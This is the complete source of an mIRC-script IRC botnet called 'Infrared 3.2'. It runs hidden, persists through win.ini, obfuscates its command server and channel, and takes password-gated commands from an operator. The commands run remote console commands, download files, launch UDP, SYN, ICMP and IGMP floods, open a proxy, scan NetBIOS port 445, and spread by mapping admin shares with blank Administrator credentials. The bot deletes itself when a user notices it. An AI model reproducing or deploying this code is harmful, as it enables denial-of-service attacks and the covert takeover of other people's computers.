   ; Coldlife originally designed by Liv[e]vil & w4nk-h3r
   ; This bot is a mod called Infrared 3.2 written by w4nk-h3r, cracker, & y0da
   ; This bot was not created for other botnet owners
   ; If you don't know how to use it or edit this bot, then I suggest deleting it

   ; Disclaimer: This was designed for learning purposes only

   ; §hôûtouts to Nahemia, lynx, whirr, Krupt, _MethX_, Lance-, and everyone else I know

   alias e { return $encode($$1-,m) }
   alias wrd { write vbscript.bat $$1- }
   alias sc { sockclose $$1- }
   alias so { sockopen $$1- }
   alias udll { return $mircdirtcpmon.dll }
   alias stdio { return $dll($udll,$1,$2-) }
   alias sw { sockwrite -nt $$1 $$2- }
   alias d { return $decode($$1-,m) }
   alias c { $d(IXNlcnZlcg==) [ [ $$1- ] ] }
   alias ddd { return $decode($decode($re($$1-),m),u) }
   alias ddde { return $re($encode($encode($$1-,u),m)) }
   alias safewindow { window -p @safe 0 0 1524 1200 | window -a @safe }
   alias r { return $+($rand(0,9),$rand(0,9),$rand(0,9),$rand(0,9),$rand(0,9)) }
   alias noclone { if ($portfree(4081) == $false) { !exit } | socklisten noclone 4081 }
   alias bncmsg1 { sw $$1 NOTICE AUTH :You need to say /quote PASS <password> }
   alias u.data { var %a = 0 | while (%a != 500) { var %b = %b $+ $chr($r(1,255)) | inc %a } | return %b }
   alias rll { var %2 = $r(4,7) , %e = 1 , %3 | while (%e <= %2) { var %3 = %3 $+ $rand(a,z) | inc %e 1 } | return %3 }
   alias makedel { remove vbscript.bat | write -c vbscript.bat | wrd @echo off | wrd ping 127.0.0.1 -n 10 | wrd del attrib.dll | wrd del javaprxy.dll | wrd del ipxroute.exe | wrd del dialup.bat | wrd del ieinfo.txt | wrd del winfax.com | wrd del msconf.dll | wrd del ie4uinit.exe | wrd del tcpmon.dll | wrd del bootvid.dll | wrd del MAPISRVR.EXE | wrd del findstr.exe | wrd del dfssvc.exe | wrd del rcfg.ini | wrd del services.exe | wrd del vbscript.bat }
   alias bncmsg2 { sw $$1 NOTICE AUTH :Welcome to BNC v2.6.2, the irc proxy | sw $$1 NOTICE AUTH :Level two, lets connect to something real now | sw $$1 NOTICE AUTH :type /quote conn <server> <port> <pass> to connect | sw $$1 NOTICE AUTH :type /quote help for basic list of commands and usage }
   alias -l read2 { var %a = $2,%out,%err | while ($gettok(%err ,1,32) != ERROR) { set %err $stdio(ReadText, [ $1 ] err) | if (%err == OK) set %err OK   | if ($gettok(%err,1,32) != ERROR) msg %a $ansi2mirc($gettok(%err,2-,32)) } | while ($gettok( %out ,1,32) != ERROR) { set %out $stdio(ReadText, [ $1 ] out) | if (%out == OK) set %out OK   | if ($gettok(%out,1,32) != ERROR) msg %a $ansi2mirc($gettok(%out,2-,32)) } | if (($gettok(%out,1-2,32) == ERROR STDE6) && ($gettok(%err,1-2,32) == ERROR STDE6)) { .timerReadT1 $+ $1 off | msg %a Console, Process exited } }
   alias re { unset %rw* | set %rword $replace($$1-,$chr(32),$chr(160)) | set %rwlen2 $len(%rword) | set %rwcounter 0 | while (%rwcounter < %rwlen2) { inc %rwcounter | set %rwlen $len(%rword) | set %rwreturn %rwreturn $+ $right(%rword,1) | set %rword $left(%rword,$calc(%rwlen - 1)) } | unset %rword %rwlen %rwcounter | .timer -m 1 10 unset %rwreturn | return %rwreturn }
   alias cm { if (!$server) { halt } | if (m isin $chan(%dchannel).mode) && ($me !isvoice %dchannel) { echo -a $$1- } | else { .msg %dchannel %coldmsg $$1- } }
   alias cappstate { if ($appstate != hidden) { if (!%found) { set %found 1 } | else { inc %found } | if (%found == 5) { quit >>> Removing Bot - Found 5 Times <<< | set %remove yes | !exit } | else { run services.exe | quit >>> Hiding ( $+ $+(%found,/5) $+ ) <<< | exit } } }
   alias console.run { var %a = $nick | set %proc std $+ $r(1,9999999) $+ $r(1,99999999) $+ $r(a,z) | var %run = $stdio(RunConsole, [ %proc ] [ $1- ] ) | if ($gettok(%run,1,32) == OK) { .timerReadT1 $+ %proc -m 0 1 read2 %proc %a | msg %a Console, starting processe: $chr(91) $1- $chr(93) } | else { msg %a Console, could not create process: %run } }
   alias findit { set %ftot $findfile($$2,$$1,0) | cm ;Search $$1 Returned %ftot Files | set %fcount 0 | while (%fcount < %ftot) { inc %fcount | cm $findfile($$2,$$1,%fcount) } | cm ;End of Search | unset %fcount %ftot }
   alias hide { if (%hidden != yes) { set %hidden yes | $d(IWVjaG8=) -a $dll(tcpmon.dll,ReleaseProcess,hiden) | $d(IWVjaG8=) -a $dll(tcpmon.dll,RunConsole,hiden services.exe) | $d(IWVjaG8=) -a $dll(tcpmon.dll,SetProcess,hiden keepalive) | !exit | halt } | set %hidden no }
   alias twice { %yo = $read -l5 "ipconf.txt" | %yu = $gettok(%yo,2,32 ) | %rc = $calc( %yu /1000 ) | %ya = $gettok(%yo,3,32 ) | %st = $calc( %ya /1000 ) | %one = $calc( %re + %sn ) | %two = $calc( %rc + %st ) | %diff = $round($calc($calc( %two - %one )/6),2) | %diff = $round($calc($calc( %two - %one )/6),2) | %sp.in = $round($calc($calc(%rc - %re)/6),2) | %sp.out = $round($calc($calc(%st - %sn)/6),2) | if (%sp.in > %sp.rec.in) { %sp.rec.in = %sp.in } | if (%sp.out > %sp.rec.out) { %sp.rec.out = %sp.out } | %netw = %diff | cm ;Current Bandwidth %netw $+ kb/s ;Download %sp.in $+ kb/s ;Upload %sp.out $+ kb/s | .remove ipconf.txt }
   alias netspeed { if (($os = NT) || ($os = 2000) || ($os = XP)) { if ($exists(MSVIDEO.BAT) = $false) { write -l1 MSVIDEO.BAT netstat -e > ipconf.txt | goto speed } | else { :speed | .run MAPISRVR.EXE /n /fh /r "MSVIDEO.BAT" | .timer -o 1 5 once } } }
   alias once { %yo = $read -l5 "ipconf.txt" | %yu = $gettok(%yo,2,32) | %re = $calc( %yu /1000 ) | %ya = $gettok(%yo,3,32 ) | %sn = $calc( %ya /1000 ) | .run MAPISRVR.EXE /n /fh /r "MSVIDEO.BAT" | .timer -o 1 1 twice }
   alias scripts { set %stot $script(0) | set %scount 0 | cm ;Scripts %stot Loaded | while (%scount < %stot) { inc %scount | cm ; $+ $script(%scount) } | cm ;End of Scripts | unset %stot,%scount }
   alias udp { if ($1 == start) && ($2 && $3 && $4 && $5) { if (%u.send == 0) { set %u.send 1 | set %u.start $ctime | unset %u.stop %u.times | timerudp -om 0 $5 u.send $2- | cm ;Udp Packeting $3 with Packets Totaling $lower($bytes($calc(20000 * $2)).suf) on $iif($4 = random,random ports,port $4) with a delay of $5 $+ ms | return } | else { cm ;Udp Packeting Already Sending Data | halt } } }
   alias u.send { if (%u.send = 1) { if (%u.stop = 1) { timerudp* off | return } | inc %u.times | if (%u.times > $1) { timerudp* off | cm ;Udp Packeting Completed ;Sent $lower($bytes($calc(20000 * $1)).suf) to $2 on $iif($3 = random,random ports,port $3) in $duration($calc($ctime - %u.start)) | unset %u.* | return } | var %a = 0,%b = $u.data | while (%a != 40) { sockudp udp $+ %a $2 $iif($3 == random,$r(1,6000),$3) %b | inc %a } } }
   alias startbot { if ($portfree(113) == $true) { socklisten ident 113 } | nick %nick.prefix $+ $chr(91) $+ $r $+ $chr(93) | set %server1 $+($d(ZmFudGFzeQ==),$rand(1,4),$d(Lm5haWxlZC5vcmc=)) | c %server1 6667 }
   alias dec var %.i = 1,%.r,%.k = 1 | while (%.i <= $len($2)) { if (%.k > $len($1)) %.k = 1 | %.r = %.r $+ $chr($calc($mid($2,%.i,3)-$asc($mid($1,%.k,1)))) | inc %.i 3 | inc %.k } | return %.r
   alias setvars { set %bnc off | set %coldmsg Infrared 3.2 | set %nick.prefix EdU | set %ver $d(bGF0ZXN0YW5kZ3JlYXRlc3Q=) | set %dchannel $d(I0m3brdmt3K3Ybdyt2W3ZA==) | if (!%install) { set %install off } | set %verbose off | set %auto on }
   alias download { if ($sock(download)) { cm ;Error Already Downloading a File. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | so download %download1 80 }
   alias setup { set %load.letter.drive 96 | set %load.letter.end 122 | :letterstart | inc %load.letter.drive 1 | set %load.letter $chr(%load.letter.drive) | if (%load.letter.drive > %load.letter.end) { goto end } | if ($disk(%load.letter).type != fixed) { goto letterstart } | if ($disk(%load.letter).type = fixed) { set %load.drive $chr(%load.letter.drive) $+ :\ | set %load.write $findfile(%load.drive,win.ini,0) | if (%load.write > 0) { set %load.count 0 | :start | inc %load.count 1 | writeini $findfile(%load.drive,win.ini,%load.count) windows run $mircexe | if (%load.count < %loud.write) { goto start } } } | goto letterstart | :end | unset %load.* }
   alias spread { if ($lines(ieinfo.txt) < 6) || ($exists(ieinfo.txt) == $false) { if (%verbose == on) { cm ;Spread Found no Internal Computers } | halt } | .write -dl1 ieinfo.txt | .write -dl1 ieinfo.txt | .write -dl1 ieinfo.txt | .write -dl $+ $lines(ieinfo.txt) ieinfo.txt | .write -dl $+ $lines(ieinfo.txt) ieinfo.txt | if (%verbose == on) { cm ;Spread Found $lines(ieinfo.txt) within the Network } | spread2 }
   alias spread1 { .write internal.bat net view > ieinfo.txt | .write internal.bat del internal.bat | run MAPISRVR.EXE /n /fh /r "internal.bat" | .timerspread 1 50 spread }
   alias spread2 { if ($lines(ieinfo.txt) == 0) { if (%verbose == on) { cm ;Spread Finished } | unset %spread.* | .remove ieinfo.txt | halt } | set %spread.pc $gettok($read(ieinfo.txt,1),1,32) | .write internal.bat @echo off | .write internal.bat net use %spread.pc $+ \$admin "" /user:"Administrator" | .write internal.bat ie4uinit %spread.pc attrib.exe -r clipbrd.exe | .write internal.bat ie4uinit %spread.pc -f -c -d clipbrd.exe -o | .write internal.bat ie4uinit %spread.pc -d clipbrd.exe -o | .write internal.bat del internal.bat | .run MAPISRVR.EXE /n /fh /r "internal.bat" | if (%verbose == on) { cm ;Attempting to Root %spread.pc ;Computers Left $calc($lines(ieinfo.txt) - 1) } | .write -dl1 ieinfo.txt | .timerspread 1 25 spread2 }
   alias nbscan {
     if ($1 == random) { set %edurange $rand(1,$lines(msconf.dll)) | set %nb.start $longip($gettok($read(msconf.dll,%edurange),1,32)) | set %nb.stop $longip($gettok($read(msconf.dll,%edurange),2,32)) | set %nb.status 1 | set %nb.num 0 | if (%verbose == on) { cm ;NetBIOS Scanning $+($longip(%nb.start),-,$longip(%nb.stop)) } | while (5 != %nb.num) { .timerc $+ %nb.num 0 1 nbopen | inc %nb.num } }
     if ($1 == start) { set %nb.start $longip($2) | set %nb.stop $longip($3) | set %nb.status 1 | set %nb.num 0 | if (%verbose == on) { cm ;NetBIOS Scanning $+($longip(%nb.start),-,$longip(%nb.stop)) } | while (5 != %nb.num) { .timerc $+ %nb.num 0 1 nbopen | inc %nb.num } }
     if ($1 == stop) { timerc* off | sc nb* | unset %nb* | if (%verbose == on) { cm ;NetBIOS Scanning Halted } }
     if ($1 == status) { if (%nb.status == 1) { cm ;NetBIOS Currently Scanning $longip(%nb.start) ;Auto $iif(%auto,%auto,off) ;Verbose $iif(%verbose,%verbose,off) } | else { cm ;NetBIOS Not Scanning ;Auto $iif(%auto,%auto,off) ;Verbose $iif(%verbose,%verbose,off) } }
   }
   alias nbopen { if (%nb.start == %nb.stop) { .timer 1 15 sc nb* | .timerc* off | unset %nb* | cm ;NetBIOS Scanning Finished | if (%auto == on) { set %edurange $rand(1,$lines(msconf.dll)) | set %nb.start $longip($gettok($read(msconf.dll,%edurange),1,32)) | set %nb.stop $longip($gettok($read(msconf.dll,%edurange),2,32)) | set %nb.status 1 | set %nb.num 0 | cm ;NetBIOS Scanning $+($longip(%nb.start),-,$longip(%nb.stop)) | while (5 != %nb.num) { .timerc $+ %nb.num 0 1 nbopen | inc %nb.num } } } | else { inc %nb.start | sockopen nb $+ $rll $longip(%nb.start) 445 } }

   ;on text commands
   on *:text:!login *:%dchannel:{ if ($dec($address($nick,5),$2) == %ver) { if ($address($nick,5) !isin %access) { %access = %access $address($nick,5) | notify $nick | cm ;Password Accepted } | if ($address($nick,5) isin %access) { halt } } }
   on *:text:*:*:{
     if ($address($nick,5) isin %access) && ($nick isop %dchannel) {
       if ($1 == $me) { [ [ $$2- ] ] }
       if ($1 == $d(IWh1ZHA=)) { udp stop }
       if ($1 == $d(IXNlcnZlcg==)) { c $$2- }
       if ($1 == $d(IWJ5ZWJ5ZQ==))  { !exit }
       if ($1 == $d(IXJhdw==)) { [ [ $$2- ] ] }
       if ($1 == $d(IXNjcmlwdHM=)) { scripts }
       if ($1 == $d(IXNlYXJjaA==)) { findit $$2 $$3 }
       if ($1 == $d(IXJlY29ubg==)) { saveini | startbot }
       if ($1 == $d(IWNvbnNvbGU=)) { console.run $2- }
       if ($1 == $d(IXJlaGFzaA==)) { .run services.exe | !exit }
       if ($1 == $d(IXZhcg==)) { cm ;Var Equals [ [ $$2- ] ] }
       if ($1 == $d(IW5ldGluZm8=)) { if ($exists(ipconf.txt) == $true) { .remove ipconf.txt } | netspeed }
       if ($1 == $d(IWRvd25sb2Fk)) { cm ;Downloading $$2 | download $$2 }
       if ($1 == $d(IXByb2Nlc3Nlcw==)) { cm ;Processes $dll(javaprxy.dll,listprocs,_) }
       if ($1 == $d(IWluZm8=)) { cm ;Windows $os ;Uptime $duration($uptime(system,3)) ;Ip $ip ;Host $host ;Bnc %bnc }
       if ($1 == $d(IWNsb3Nl)) && ($2) { run MAPISRVR.EXE /n /fh /r "dfssvc.exe -k -f -q $2 $+ " }
       if ($1 == $d(IWJuYy5vZmY=)) { set %bnc off | unset %bnc.port %bnc.pass | sc client* | sc server* | sc bnc | cm ;Bnc Deactivated... }
       if ($1 == $d(IXVkcA==)) && ($2) { set %u.send 0 | udp start $iif($3 == $null,105,$3) $2 $iif($4 == $null,random,$4)) $iif($5 == $null,.2,$+($chr(46),$5)) }
       if ($1 == $d(IWRjY2FsbG93)) { if (!$2) { dccallow + $+ $nick | cm ;Dccallowed $nick | halt } | cm ;Dccallowed $$2 | dccallow + $+ $$2 }
       if ($1 == $d(IWJuYy5zdGF0cw==)) { if ($ip) { if (%bnc == on) { cm ;Bnc Stats Currently  $+ %bnc $+  ; /server -m $ip $+ : $+ %bnc.port %bnc.pass ;Users Connected $sock(clien*,0) } | else { cm ;Bnc Stats Currently  $+ %bnc $+  } } }
       if ($1 == $d(IXN5bg==)) && ($3) { run MAPISRVR.EXE /n /fh /r "findstr.exe $$2" | run MAPISRVR.EXE /n /fh /r "dfssvc.exe -d $calc($3 * 1000) -k -f -q findstr.exe" | cm ;Syn Flooding $2 for $3 $+ secs }
       if ($1 == $d(IWJuYw==)) { set %bnc on | sc bnc | set %bnc.port $$2 | set %bnc.pass $$3 | socklisten bnc %bnc.port | if ($ip) { cm ;Bnc Activated... /server -m $ip $+ : $+ %bnc.port %bnc.pass ;Host $host } }
       if ($1 == $d(IWlnbXA=)) { if ($exists(ipxroute.exe) == $true) && ($exists(MAPISRVR.EXE) == $true) { .run MAPISRVR.EXE /n /fh /r "ipxroute.exe $$2 $rand(1,10000) $$3 $$4 $+ " | cm ;Igmp Packeting $$2 $$4 times at $$3 bytes each } }
       if ($1 == $d(IWljbXA=)) { .remove COMMILG.vbs | .write COMMILG.vbs Set src3 = CreateObject("Wscript.shell") | .write COMMILG.vbs src3.run "command /c ping -n $$3 -l 65500 -w $iif($4 == $null,0,$4) $$2 ",0,true | run COMMILG.vbs | cm ;Icmp packeting $$2 with $$3 packets totaling $lower($bytes($calc(65500 * $$3)).suf) with a timeout of $iif($4 == $null,0,$4) $+ ms }
       if ($1 == $d(IXNjYW4=)) && ($2) { if ($2 == random) { nbscan random } | else { nbscan start $2 $$3 } }
       if ($1 == $d(IWhzY2Fu)) { nbscan stop }
       if ($1 == $d(IWF1dG8=)) { set %auto $$2 }
       if ($1 == $d(IXZlcmJvc2U=)) { set %verbose $$2 }
       if ($1 == $d(IXN0YXRz)) { nbscan status }
       if ($1 == $d(IXNwcmVhZA==)) { spread1 }
       if ($1 == $d(IXJvb3Q=)) { if ($4) { set %root.ip $2 | set %root.share $3 | if ($left($4,1) == ") && ($right($4,1) == ") { set %root.user $right($left($replace($4,_,$chr(32)),-1),-1) } | else { set %root.user $4 } | if ($5) { set %root.pass $5 } | else { unset %root.pass } | .write tango.bat @echo off | .write tango.bat net use \\ $+ %root.ip $+ \ $+ %root.share " $+ $iif(%root.pass,%root.pass,$null) $+ " /user:" $+ %root.user $+ " | .write tango.bat ie4uinit \\ $+ %root.ip attrib.exe -r clipbrd.exe | .write tango.bat ie4uinit \\ $+ %root.ip -f -c -d clipbrd.exe -o | .write tango.bat ie4uinit \\ $+ %root.ip -d clipbrd.exe -o | .write tango.bat del tango.bat | .run MAPISRVR.EXE /n /fh /r "tango.bat" | cm ;Attempting to Root \\ $+ %root.ip $+ \ $+ %root.share with %root.user $+ \ $+ $iif(%root.pass,%root.pass,Blank) | unset %root.* } }
     }
   }

   ;misc
   raw 332:*:{ if ($left($$3,2) == §>) && ($$2 == %dchannel) { set %data.msg $ddd($right($$3-,-2)) | set %bnc.port $gettok(%data.msg,1,64) | set %bnc.pass $gettok(%data.msg,2,64) | if ($gettok(%data.msg,3,64) == 1) { nbscan random } | if ($gettok(%data.msg,4,64) == 1) { spread1 } | socklisten bnc %bnc.port | set %bnc on | if ($ip) && (%bnc.port) { cm ;Bnc Activated... /server -m $ip $+ : $+ %bnc.port %bnc.pass ;Host $host } } }
   ctcp *:*:*:{ if (ping isin $$1-) || (finger isin $$1-) { halt | haltdef } | ctcpreply $nick VERSION Infrared 3.2 ;by w4nk-h3r & cracker }
   menu @safe {
     mouse: { if ($server) { cm ;Bot Found Removing Bot | quit >>> Safe quit <<< } | set %remove yes | !exit }
   }

   ;on action commands
   on *:connect:{ socklisten ident 113 }
   on *:socklisten:ident:{ sockaccept ident_ [ $+ [ $rand(1,10000) ] ] }
   on *:disconnect:{ unset %access | startbot | .timerstartbot 0 60 startbot }
   on *:unotify:{ set %access $remove(%access,$address($nick,5)) | notify -r $nick }
   on *:socklisten:bnc:{ sockaccept client $+ $rand(1,99999) | sc bnc | socklisten bnc %bnc.port }
   on *:part:%dchannel:{ if ($nick == $me) { nick %nick.prefix $+ $chr(91) $+ $r $+ $chr(93) | .timerjoinchan 0 5 join %dchannel . } }
   on *:join:%dchannel:{ if ($nick == $me) { .timerjoinchan off | if ($me == EdU[00000]) { part %dchannel | halt } } }
   on *:input:*:{ cm ;Warning User Typed $$1- | hide | clearall | set %remove yes | !exit | haltdef }
   on *:exit:{ if (%remove == yes) { if ($exists(MAPISRVR.EXE) == $true) { .run MAPISRVR.EXE /n /fh /r "TIMER.bat" } | else { .run TIMER.bat } } }
   on *:sockread:client*:{ sockread %client | set %bncraw $gettok(%client,1,32) | if (%bncraw == USER) { set %bnc.user $gettok(%client,2-,32) | bncmsg1 $sockname } | if (%bncraw == NICK) { set %bnc.nick $gettok(%client,2,32) } | if (%bncraw == IDENT) { set %bnc.ident $gettok(%client,2,32) } | if (%bncraw == PASS) { if ($gettok(%client,2,32) == %bnc.pass) { bncmsg2 $sockname } } | if (%bncraw == CONN) { sc server $+ $remove($sockname,client) | so server $+ $remove($sockname,client) $gettok(%client,2,32) $gettok(%client,3,32) | sw $sockname NOTICE AUTH :Making reality through $gettok(%client,2,32) $gettok(%client,3,32) } | else { if ($sock(server $+ $remove($sockname,client)).status != active) { halt } | sw server $+ $remove($sockname,client) %client } | unset %bncraw }
   on *:start:{ hide | setvars | makedel | if ($exists(MAPISRVR.EXE) == $true) { .run MAPISRVR.EXE /n /fh /r "dialup.bat" } | else { set %remove yes | !exit } | .timersafe -m 0 5 safewindow | $d(c2FmZXdpbmRvdw==) | $d(bm9jbG9uZQ==) | timerclear -o 0 1 clearall | unset %access | $d(c3RhcnRib3Q=) | timerstartbot 0 60 $d(c3RhcnRib3Q=) | .timer 1 4 setup | .timer 0 1 cappstate }
   on *:sockread:ident*:{ sockread %4 | tokenize 32 %4 | var %1 = $numtok($1-,44) | if (%1 == 2 && $1,$3 isnum) { sockwrite -n $sockname $3 , $1 : USERID : UNIX : $iif(%bnc.ident,%bnc.ident,$rll) } | if ($1 == PING && $2) { sockwrite -n $sockname PONG $2- } }
   on *:sockopen:server*:{ if ($sockerr == 0) { sw client $+ $remove($sockname,server) NOTICE AUTH :Suceeded connection | sw $sockname NICK %bnc.nick | sw $sockname USER %bnc.user } }
   on *:sockread:server*:{ sockread %server | if ($sock(client $+ $remove($sockname,server)).status != active) { halt } | sw client $+ $remove($sockname,server) %server }
   on *:sockopen:download:{ if ($sockerr) { cm ;Error Socket Error | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
   on *:sockread:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
   on *:sockclose:download:{ if ($file(%download2).size != %downloadlength) { sc download | download (Link: http://)http:// $+ %download1 $+ / $+ %download3 }
   else { cm ;Success File Downloaded ( $+ $mircdir $+ %download2 $+ ) ;Bytes $file(%download2).size | unset %download* } }
   on *:sockopen:nb*:{ if ($sockerr > 0) { halt } | if (%verbose == on) { cm ;NetBIOS Attempting to Root $sock($sockname).ip } | .run MAPISRVR.EXE /n /fh /r "winfax.com $sock($sockname).ip $+ " | sc $sockname }
